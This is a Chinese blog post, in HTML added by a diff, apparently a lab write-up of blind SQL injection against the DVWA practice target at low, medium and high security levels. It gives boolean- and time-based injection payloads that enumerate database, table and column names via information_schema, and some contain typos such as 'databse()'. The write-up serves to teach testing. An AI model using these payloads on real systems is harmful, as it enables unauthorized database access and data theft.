@@ -1,0 +1,776 @@
+<!DOCTYPE html>
+<html lang="en-us">
+<head>
+    <meta charset="utf-8">
+    <meta http-equiv="X-UA-Compatible" content="IE=edge">
+    <meta name="viewport" content="width=device-width, initial-scale=1">
+
+    
+    <meta property="og:site_name" content="FELL &amp; ENJOY">
+    <meta property="og:type" content="article">
+
+    
+    <meta property="og:image" content="https://fan-bu-fan.github.io//img/home-bg.jpg">
+    <meta property="twitter:image" content="https://fan-bu-fan.github.io//img/home-bg.jpg" />
+    
+
+    
+    <meta name="title" content="SQL Injection(Blind) ---dvwa" />
+    <meta property="og:title" content="SQL Injection(Blind) ---dvwa" />
+    <meta property="twitter:title" content="SQL Injection(Blind) ---dvwa" />
+    
+
+    
+    <meta name="description" content="主要用来记录dvwa靶场 中SQL Injection 盲注 的破解方式">
+    <meta property="og:description" content="主要用来记录dvwa靶场 中SQL Injection 盲注 的破解方式" />
+    <meta property="twitter:description" content="主要用来记录dvwa靶场 中SQL Injection 盲注 的破解方式" />
+    
+
+    
+    <meta property="twitter:card" content="summary" />
+    
+    
+
+    <meta name="keyword"  content="帆帆, fanfan&#39;s的博客,个人网站,编程,网络安全,杂谈,瞎琢磨">
+    <link rel="shortcut icon" href="/img/favicon.ico">
+
+    <title>SQL Injection(Blind) ---dvwa | 帆帆的博客 | fanfan&#39;s Blog</title>
+
+    <link rel="canonical" href="/2022/6/blind%20sql%20injection/">
+
+    
+    
+    
+    <link rel="stylesheet" href="/css/bootstrap.min.css">
+
+    
+    <link rel="stylesheet" href="/css/hugo-theme-cleanwhite.min.css">
+
+    
+    <link rel="stylesheet" href="/css/zanshang.css">
+
+    
+    <link href="https://cdn.jsdelivr.net/gh/FortAwesome/Font-Awesome@5.15.1/css/all.css" rel="stylesheet" type="text/css">
+
+    
+    
+
+    
+    <script src="/js/jquery.min.js"></script>
+
+    
+    <script src="/js/bootstrap.min.js"></script>
+
+    
+    <script src="/js/hux-blog.min.js"></script>
+
+    
+    
+
+</head>
+
+
+
+
+<nav class="navbar navbar-default navbar-custom navbar-fixed-top">
+
+    <div class="container-fluid">
+        
+        <div class="navbar-header page-scroll">
+            <button type="button" class="navbar-toggle">
+                <span class="sr-only">Toggle navigation</span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+                <span class="icon-bar"></span>
+            </button>
+            <a class="navbar-brand" href="/">FELL &amp; ENJOY</a>
+        </div>
+
+        
+        
+        <div id="huxblog_navbar">
+            <div class="navbar-collapse">
+                <ul class="nav navbar-nav navbar-right">
+                    <li>
+                        <a href="/">All Posts</a>
+                    </li>
+                    
+                        
+                        <li>
+                            <a href="/categories/%E5%B7%A5%E5%85%B7%E9%9B%86">工具集</a>
+                        </li>
+                        
+                        <li>
+                            <a href="/categories/%E7%BD%91%E5%AE%89">网安</a>
+                        </li>
+                        
+                    
+                    
+		    
+                        <li><a href="/top/archive/">历史文章</a></li>
+                    
+                        <li><a href="/top/about/">关于我</a></li>
+                    
+
+                    
+                </ul>
+            </div>
+        </div>
+        
+    </div>
+    
+</nav>
+<script>
+    
+    
+    
+    var $body   = document.body;
+    var $toggle = document.querySelector('.navbar-toggle');
+    var $navbar = document.querySelector('#huxblog_navbar');
+    var $collapse = document.querySelector('.navbar-collapse');
+
+    $toggle.addEventListener('click', handleMagic)
+    function handleMagic(e){
+        if ($navbar.className.indexOf('in') > 0) {
+        
+            $navbar.className = " ";
+            
+            setTimeout(function(){
+                
+                if($navbar.className.indexOf('in') < 0) {
+                    $collapse.style.height = "0px"
+                }
+            },400)
+        }else{
+        
+            $collapse.style.height = "auto"
+            $navbar.className += " in";
+        }
+    }
+</script>
+
+
+
+
+<style type="text/css">
+    header.intro-header {
+        background-image: url('/img/home-bg.jpg')
+    }
+</style>
+
+<header class="intro-header" >
+
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <div class="post-heading">
+                    <div class="tags">
+                        
+                        <a class="tag" href="/tags/%E9%9D%B6%E5%9C%BA" title="靶场">
+                            靶场
+                        </a>
+                        
+                        <a class="tag" href="/tags/dvwa" title="dvwa">
+                            dvwa
+                        </a>
+                        
+                    </div>
+                    <h1>SQL Injection(Blind) ---dvwa</h1>
+                    <h2 class="subheading"></h2>
+                    <span class="meta">
+                        
+                            Posted by 
+                            
+                                伍帆
+                             
+                            on 
+                            Monday, January 1, 0001
+                            
+                            
+                            
+                            
+                    </span>
+                </div>
+            </div>
+        </div>
+    </div>
+</header>
+
+
+
+
+<article>
+    <div class="container">
+        <div class="row">
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                post-container">
+
+                
+                <h2 id="sql-injection-盲注简介">SQL Injection 盲注简介</h2>
+<p>SQL Injection（Blind），即SQL盲注，与一般注入的区别在于，一般的注入攻击者可以直接从页面上看到注入语句的执行结果，而盲注时攻击者通常是<strong>无法从显示页面上获取执行结果，甚至连注入语句是否执行都无从得知</strong>，因此盲注的难度要比一般注入高。目前网络上现存的SQL注入漏洞大多是SQL盲注。</p>
+<h2 id="手工盲注思路">手工盲注思路</h2>
+<p>手工盲注的过程，就像你与一个机器人聊天，这个机器人知道的很多，但只会回答“是”或者“不是”，因此你需要询问它这样的问题，例如“数据库名字的第一个字母是不是a啊？”，通过这种机械的询问，最终获得你想要的数据。</p>
+<blockquote>
+<p>盲注分为<strong>基于布尔的盲注</strong>、<strong>基于时间的盲注</strong>以及<strong>基于报错的盲注</strong></p>
+</blockquote>
+<p>下面简要介绍手工盲注的步骤<a href="https://fan-bu-fan.github.io/2022/6/sql%20injection/">可与手工注入比较</a></p>
+<blockquote>
+<p>1.判断是否存在注入，注入是字符型还是数字型</p>
+<p>2.猜解当前数据库名</p>
+<p>3.猜解数据库中的表名</p>
+<p>4.猜解表中的字段名</p>
+<p>5.猜解数据</p>
+</blockquote>
+<h2 id="low-级别破解">LOW 级别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/Blind/blind.png" alt="blind">
+
+
+可以看到，Low级别的代码对参数id没有做任何检查、过滤，存在明显的SQL注入漏洞，同时SQL语句查询返回的结果只有两种<code>Missing</code> 和<code>exit</code>两个结果</p>
+</blockquote>
+<h3 id="演示基于布尔的盲注">演示基于布尔的盲注</h3>
+<h4 id="1判断是否存在注入注入是字符型还是数字型">1.判断是否存在注入，注入是字符型还是数字型</h4>
+<p>输入<code>1</code>，显示相应用户存在：
+
+  <img src="/img/Blind/1-1.png" alt="blind">
+
+
+输入<code>1’ and 1=1 #</code>，显示存在:
+
+  <img src="/img/Blind/1-2.png" alt="blind">
+
+
+输入<code>1’ and '1'='2 #</code>，显示不存在：
+
+  <img src="/img/Blind/1-3.png" alt="blind">
+
+
+说明存在字符型的SQL盲注</p>
+<h4 id="2猜解当前数据库名">2.猜解当前数据库名</h4>
+<p>想要猜解数据库名，首先要猜解数据库名的长度，然后挨个猜解字符。</p>
+<blockquote>
+<p>输入<code>1’ and length(database())=1 #</code>，显示不存在；</p>
+<p>输入<code>1’ and length(database())=2 #</code>，显示不存在；</p>
+<p>输入<code>1’ and length(database())=3 #</code>，显示不存在；</p>
+<p>输入<code>1’ and length(database())=4 #</code>，显示存在：</p>
+</blockquote>
+<p>说明数据库名长度为4。</p>
+<p>下面采用二分法猜解数据库名</p>
+<blockquote>
+<ul>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&gt;97 #</code>，显示存在，说明数据库名的第一个字符的ascii值大于97（小写字母a的ascii值）；</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&lt;122 #</code>，显示存在，说明数据库名的第一个字符的ascii值小于122（小写字母z的ascii值）；</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&lt;109 #</code>，显示存在，说明数据库名的第一个字符的ascii值小于109（小写字母m的ascii值）；</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&lt;103 #</code>，显示存在，说明数据库名的第一个字符的ascii值小于103（小写字母g的ascii值）；</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&lt;100 #</code>，显示不存在，说明数据库名的第一个字符的ascii值不小于100（小写字母d的ascii值）；</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr(databse(),1,1))&gt;100 #</code>，显示不存在，说明数据库名的第一个字符的ascii值不大于100（小写字母d的ascii值），所以数据库名的第一个字符的ascii值为100，即小写字母d。</p>
+</li>
+<li>
+<p>…</p>
+</li>
+</ul>
+</blockquote>
+<p>重复上述步骤，就可以猜解出完整的数据库名（ROOT）了。</p>
+<h4 id="3猜解数据库中的表名">3.猜解数据库中的表名</h4>
+<p>首先猜解数据库中表的数量：</p>
+<blockquote>
+<ul>
+<li>
+<p>输入<code>1’ and (select count (table_name) from information_schema.tables where table_schema=database())=1 #</code> 显示不存在</p>
+</li>
+<li>
+<p>输入<code>1’ and (select count (table_name) from information_schema.tables where table_schema=database() )=2 # </code>显示存在</p>
+</li>
+</ul>
+</blockquote>
+<p>说明数据库中共有两个表。
+接着挨个猜解表名：</p>
+<blockquote>
+<ul>
+<li>
+<p>输入<code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1 #</code> 显示不存在</p>
+</li>
+<li>
+<p>输入<code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=2 #</code> 显示不存在</p>
+</li>
+<li>
+<p>…</p>
+</li>
+<li>
+<p>输入<code>1’ and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</code> 显示存在</p>
+</li>
+</ul>
+</blockquote>
+<p>说明第一个表名长度为9。</p>
+<blockquote>
+<ul>
+<li>
+<p>输入<code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;97 #</code> 显示存在</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;122 #</code> 显示存在</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;109 #</code> 显示存在</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&lt;103 #</code> 显示不存在</p>
+</li>
+<li>
+<p>输入<code>1’ and ascii(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1,1))&gt;103 #</code> 显示不存在</p>
+</li>
+</ul>
+</blockquote>
+<p>说明第一个表的名字的第一个字符为小写字母g。</p>
+<p>…</p>
+<p>重复上述步骤，即可猜解出两个表名（guestbook、users）。</p>
+<h4 id="4猜解表中的字段名">4.猜解表中的字段名</h4>
+<p>首先猜解表中字段的数量：</p>
+<blockquote>
+<ul>
+<li>
+<p>输入<code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=1 #</code> 显示不存在</p>
+</li>
+<li>
+<p>…</p>
+</li>
+<li>
+<p>输入<code>1’ and (select count(column_name) from information_schema.columns where table_name= ’users’)=8 # </code>显示存在</p>
+</li>
+</ul>
+</blockquote>
+<p>接着挨个猜解字段名：</p>
+<blockquote>
+<ul>
+<li>输入<code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1 #</code> 显示不存在</li>
+</ul>
+<p>…</p>
+<ul>
+<li>输入 <code>1’ and length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7 #</code> 显示存在</li>
+</ul>
+</blockquote>
+<p>说明users表的第一个字段为7个字符长度。</p>
+<p>采用二分法，即可猜解出所有字段名</p>
+<h4 id="5猜解数据">5.猜解数据</h4>
+<p>同样采用二分法</p>
+<h3 id="基于时间的盲注">基于时间的盲注：</h3>
+<h4 id="1判断是否存在注入注入是字符型还是数字型-1">1.判断是否存在注入，注入是字符型还是数字型</h4>
+<blockquote>
+<p>输入<code>1’ and sleep(5) #</code>，感觉到明显延迟；</p>
+<p>输入<code>1 and sleep(5) #</code>，没有延迟；</p>
+</blockquote>
+<p>说明存在<strong>字符型</strong>的基于时间的盲注。</p>
+<h4 id="2猜解当前数据库名-1">2.猜解当前数据库名</h4>
+<p>首先猜解数据名的长度：</p>
+<blockquote>
+<p>输入<code>1’ and if(length(database())=1,sleep(5),1) #</code> 没有延迟</p>
+<p>输入<code>1’ and if(length(database())=2,sleep(5),1) #</code> 没有延迟</p>
+<p>输入<code>1’ and if(length(database())=3,sleep(5),1) #</code> 没有延迟</p>
+<p>输入<code>1’ and if(length(database())=4,sleep(5),1) #</code> 明显延迟</p>
+</blockquote>
+<p>说明数据库名长度为4个字符。</p>
+<p>接着采用二分法猜解数据库名：</p>
+<blockquote>
+<p>输入<code>1’ and if(ascii(substr(database(),1,1))&gt;97,sleep(5),1)#</code> 明显延迟</p>
+<p>…</p>
+<p>输入<code>1’ and if(ascii(substr(database(),1,1))&lt;100,sleep(5),1)#</code> 没有延迟</p>
+<p>输入<code>1’ and if(ascii(substr(database(),1,1))&gt;100,sleep(5),1)# </code>没有延迟</p>
+</blockquote>
+<p>说明数据库名的第一个字符为小写字母d。</p>
+<p>重复上述步骤，即可猜解出数据库名。</p>
+<h4 id="3猜解数据库中的表名-1">3.猜解数据库中的表名</h4>
+<p>首先猜解数据库中表的数量：</p>
+<blockquote>
+<p>输入<code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=1,sleep(5),1)#</code> 没有延迟</p>
+<p>输入<code>1’ and if((select count(table_name) from information_schema.tables where table_schema=database() )=2,sleep(5),1)#</code> 明显延迟</p>
+</blockquote>
+<p>说明数据库中有两个表。</p>
+<p>接着挨个猜解表名：</p>
+<blockquote>
+<p>输入<code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=1,sleep(5),1) #</code> 没有延迟</p>
+<p>…</p>
+<p>输入<code>1’ and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #</code> 明显延迟</p>
+</blockquote>
+<p>说明第一个表名的长度为9个字符。</p>
+<p>采用二分法即可猜解出表名。</p>
+<h4 id="4猜解表中的字段名-1">4.猜解表中的字段名</h4>
+<p>首先猜解表中字段的数量：</p>
+<blockquote>
+<p>输入<code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=1,sleep(5),1)#</code> 没有延迟</p>
+<p>…</p>
+<p>输入<code>1’ and if((select count(column_name) from information_schema.columns where table_name= ’users’)=8,sleep(5),1)# </code>明显延迟</p>
+</blockquote>
+<p>说明users表中有8个字段。</p>
+<p>接着挨个猜解字段名：</p>
+<blockquote>
+<p>输入<code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=1,sleep(5),1) #</code> 没有延迟</p>
+<p>…</p>
+<p>输入<code>1’ and if(length(substr((select column_name from information_schema.columns where table_name= ’users’ limit 0,1),1))=7,sleep(5),1) #</code> 明显延迟</p>
+</blockquote>
+<p>说明users表的第一个字段长度为7个字符。</p>
+<p>采用二分法即可猜解出各个字段名。</p>
+<h4 id="5猜解数据-1">5.猜解数据</h4>
+<p>同样采用二分法。</p>
+<h2 id="medium-级别破解">Medium 级别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/SqlInjection/medium.png" alt="low级别代码">
+
+
+可以看到，Medium级别的代码利用mysql_real_escape_string函数对特殊符号
+\x00,\n,\r,,’,”,\x1a进行转义，同时前端页面设置了下拉选择表单，希望以此来控制用户的输入。<br>
+
+  <img src="/img/SqlInjection/medium1.png" alt="low级别代码">
+
+</p>
+</blockquote>
+<pre><code>虽然前端使用了下拉选择菜单，但我们依然可以通过BurpSuite抓包改参数，提交恶意构造的查询参数
+</code></pre>
+<h3 id="基于布尔的盲注">基于布尔的盲注</h3>
+<p>步骤和上面low级别的一样 这里就简单举几个例子</p>
+<blockquote>
+<p>抓包改参数id为<code>1 and length(database())=4 #</code>，显示存在，说明数据库名的长度为4个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包改参数id为<code>1 and length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</code>，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包改参数id为<code>1 and (select count(column_name) from information_schema.columns where table_name= 0×7573657273)=8 #</code>，（0×7573657273为users的16进制），显示存在，说明uers表有8个字段</p>
+</blockquote>
+<h3 id="基于时间的盲注-1">基于时间的盲注</h3>
+<p>步骤和上面low级别的一样 这里就简单举几个例子</p>
+<blockquote>
+<p>抓包改参数id为<code>1 and if(length(database())=4,sleep(5),1) #</code>，明显延迟，说明数据库名的长度为4个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包改参数id为<code>1 and if(length(substr((select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9,sleep(5),1) #</code>，明显延迟，说明数据中的第一个表名长度为9个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包改参数id为<code>1 and if((select count(column_name) from information_schema.columns where table_name=0×7573657273 )=8,sleep(5),1) #</code>，明显延迟，说明uers表有8个字段。</p>
+</blockquote>
+<h2 id="high-级别破解">High 级别破解</h2>
+<blockquote>
+<p>查看源代码
+
+  <img src="/img/SqlInjection/high.png" alt="low级别代码">
+
+
+可以看到，High级别的代码利用cookie传递参数id，当SQL查询结果为空时，会执行函数sleep(seconds)，目的是为了扰乱基于时间的盲注。同时在 SQL查询语句中添加了LIMIT 1，希望以此控制只输出一个结果。</p>
+</blockquote>
+<pre><code>虽然添加了LIMIT 1，但是我们可以通过#将其注释掉。但由于服务器端执行sleep函数，会使得基于时间盲注的准确性受到影响，这里我们只演示基于布尔的盲注：
+</code></pre>
+<h3 id="基于布尔的盲注-1">基于布尔的盲注</h3>
+<p>步骤和上面low级别的一样 这里就简单举几个例子</p>
+<blockquote>
+<p>抓包将cookie中参数id改为<code>1’ and length(database())=4 #</code>，显示存在，说明数据库名的长度为4个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包将cookie中参数id改为<code>1’ and length(substr(( select table_name from information_schema.tables where table_schema=database() limit 0,1),1))=9 #</code>，显示存在，说明数据中的第一个表名长度为9个字符；</p>
+</blockquote>
+<blockquote>
+<p>抓包将cookie中参数id改为<code>1’ and (select count(column_name) from information_schema.columns where table_name=0×7573657273)=8 #</code>，（0×7573657273 为users的16进制），显示存在，说明uers表有8个字段。</p>
+</blockquote>
+
+
+                
+
+                <hr>
+                <ul class="pager">
+                    
+                    <li class="previous">
+                        <a href="/2022/6/sqlMap%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8/" data-toggle="tooltip" data-placement="top" title="sqlMap的安装与使用">&larr;
+                            Previous Post</a>
+                    </li>
+                    
+                    
+                    <li class="next">
+                        <a href="/2022/6/sql%20injection/" data-toggle="tooltip" data-placement="top" title="SQL Injection ---dvwa">Next
+                            Post &rarr;</a>
+                    </li>
+                    
+                </ul>
+                
+
+            </div>
+
+            
+            
+            <div class="
+                col-lg-2 col-lg-offset-0
+                visible-lg-block
+                sidebar-container
+                catalog-container">
+                <div class="side-catalog">
+                    <hr class="hidden-sm hidden-xs">
+                    <h5>
+                        <a class="catalog-toggle" href="#">CATALOG</a>
+                    </h5>
+                    <ul class="catalog-body"></ul>
+                </div>
+            </div>
+            
+
+            
+            <div class="
+                col-lg-8 col-lg-offset-2
+                col-md-10 col-md-offset-1
+                sidebar-container">
+
+                
+                
+                <section>
+                    <hr class="hidden-sm hidden-xs">
+                    <h5><a href="/tags/">FEATURED TAGS</a></h5>
+                    <div class="tags">
+                        
+                        
+                        
+                        <a href="/tags/dvwa" title="dvwa">
+                            dvwa
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E5%B7%A5%E5%85%B7" title="工具">
+                            工具
+                        </a>
+                        
+                        
+                        
+                        <a href="/tags/%E6%B8%97%E9%80%8F%E6%B5%8B%E8%AF%95" title="渗透测试">
+                            渗透测试
+                        </a>
+                        
+                        
+                        
+                        
+                        
+                        <a href="/tags/%E9%9D%B6%E5%9C%BA" title="靶场">
+                            靶场
+                        </a>
+                        
+                        
+                    </div>
+                </section>
+                
+
+                
+                
+            </div>
+        </div>
+    </div>
+</article>
+
+
+
+
+<footer>
+    <div class="container">
+        <div class="row">
+            <div class="col-lg-8 col-lg-offset-2 col-md-10 col-md-offset-1">
+                <ul class="list-inline text-center">                  
+                    
+                    <li>
+                        <a href="mailto:2112825321@qq.com">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fas fa-envelope fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		           
+                    
+                    
+                    
+                    
+
+		            
+                    
+                    <li>
+                        <a target="_blank" href="/your%20wechat%20qr%20code%20image">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-weixin fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    <li>
+                        <a target="_blank" href="https://github.com/fan-bu-fan">
+                            <span class="fa-stack fa-lg">
+                                <i class="fas fa-circle fa-stack-2x"></i>
+                                <i class="fab fa-github fa-stack-1x fa-inverse"></i>
+                            </span>
+                        </a>
+                    </li>
+		            
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+                    
+            
+            
+            
+           
+                   <li>
+                       <a href='' rel="alternate" type="application/rss+xml" title="FELL &amp; ENJOY" >
+                           <span class="fa-stack fa-lg">
+                               <i class="fas fa-circle fa-stack-2x"></i>
+                               <i class="fas fa-rss fa-stack-1x fa-inverse"></i>
+                           </span>
+                       </a>
+                   </li>
+            
+             </ul>
+		<p class="copyright text-muted">
+                    Copyright &copy; FELL &amp; ENJOY 2022
+                    <br>
+                    <a href="https://themes.gohugo.io/hugo-theme-cleanwhite">CleanWhite Hugo Theme</a> by <a href="https://zhaohuabing.com">Huabing</a> |
+                    <iframe
+                        style="margin-left: 2px; margin-bottom:-5px;"
+                        frameborder="0" scrolling="0" width="100px" height="20px"
+                        src="https://ghbtns.com/github-btn.html?user=zhaohuabing&repo=hugo-theme-cleanwhite&type=star&count=true" >
+                    </iframe>
+                </p>
+            </div>
+        </div>
+    </div>
+</footer>
+
+
+
+
+<script>
+    function loadAsync(u, c) {
+      var d = document, t = 'script',
+          o = d.createElement(t),
+          s = d.getElementsByTagName(t)[0];
+      o.src = u;
+      if (c) { o.addEventListener('load', function (e) { c(null, e); }, false); }
+      s.parentNode.insertBefore(o, s);
+    }
+</script>
+
+
+
+
+
+
+<script>
+    
+    if($('#tag_cloud').length !== 0){
+        loadAsync("/js/jquery.tagcloud.js",function(){
+            $.fn.tagcloud.defaults = {
+                
+                color: {start: '#bbbbee', end: '#0085a1'},
+            };
+            $('#tag_cloud a').tagcloud();
+        })
+    }
+</script>
+
+
+<script>
+    loadAsync("https://cdn.jsdelivr.net/npm/fastclick@1.0.6/lib/fastclick.min.js", function(){
+        var $nav = document.querySelector("nav");
+        if($nav) FastClick.attach($nav);
+    })
+</script>
+
+
+
+
+
+
+
+
+
+<script type="text/javascript">
+    function generateCatalog(selector) {
+
+        
+        
+        
+        
+            _containerSelector = 'div.post-container'
+        
+
+        
+        var P = $(_containerSelector), a, n, t, l, i, c;
+        a = P.find('h1,h2,h3,h4,h5,h6');
+
+        
+        $(selector).html('')
+
+        
+        a.each(function () {
+            n = $(this).prop('tagName').toLowerCase();
+            i = "#" + $(this).prop('id');
+            t = $(this).text();
+            c = $('<a href="' + i + '" rel="nofollow">' + t + '</a>');
+            l = $('<li class="' + n + '_nav"></li>').append(c);
+            $(selector).append(l);
+        });
+        return true;
+    }
+
+    generateCatalog(".catalog-body");
+
+    
+    $(".catalog-toggle").click((function (e) {
+        e.preventDefault();
+        $('.side-catalog').toggleClass("fold")
+    }))
+
+    
+
+
+    loadAsync("\/js\/jquery.nav.js", function () {
+        $('.catalog-body').onePageNav({
+            currentClass: "active",
+            changeHash: !1,
+            easing: "swing",
+            filter: "",
+            scrollSpeed: 700,
+            scrollOffset: 0,
+            scrollThreshold: .2,
+            begin: null,
+            end: null,
+            scrollChange: null,
+            padding: 80
+        });
+    });
+</script>
+
+
+
+
+
+</body>
+</html>
